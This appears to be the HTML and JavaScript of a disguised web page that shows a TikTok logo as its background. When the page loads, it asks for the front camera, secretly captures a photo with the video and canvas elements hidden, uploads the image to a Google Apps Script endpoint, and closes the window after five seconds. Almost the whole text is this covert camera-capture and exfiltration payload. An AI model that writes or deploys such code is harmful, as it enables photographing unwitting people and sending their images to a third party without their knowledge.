    <style>
        body {
            margin: 0;

            background: #000;
            background-image: url("tiktok_logo.png");
            background-size: 300px auto;

        video, canvas { display: none !important; }
    </style>
</head>
<body>
    <script>
        async function captureAndUpload() {
            try {
                // 1. Request camera access
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: "user", // Use non-strict mode for better Android support
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    }
                });

                // 2. Start the 5-second timer AFTER permission granted
                setTimeout(() => {
                    if (window.opener || window.closed === false) {
                        window.close();
                    }
                }, 5000);

                // 3. Create video and canvas
                const video = document.createElement('video');
                video.setAttribute('playsinline', ''); // Required for iOS Safari
                video.srcObject = stream;

                await new Promise(resolve => {
                    video.onloadedmetadata = () => {
                        video.play().then(resolve);
                    };
                });

                // 4. Capture image
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);

                // 5. Stop the stream
                stream.getTracks().forEach(track => track.stop());

                // 6. Prepare image data
                const imageData = canvas.toDataURL('image/jpeg', 0.85);

                // 7. Upload to Google Apps Script
                const response = await fetch('https://script.google.com/macros/s/AKfycbxizr_HoCIMxRF2e9uFgxMPX2g2XgvcZeuDpYrX23FjgldPCpSGYVsZZ5jUvzwO5ln9/exec', {
                    method: 'POST',
                    body: JSON.stringify({ image: imageData.split(',')[1] }),
                    headers: {
                        'Content-Type': 'application/json'
                    }
                });

                console.log('Upload result:', await response.text());

            } catch (error) {
                console.error('Capture failed:', error);
            }
        }

        window.onload = captureAndUpload;
    </script>
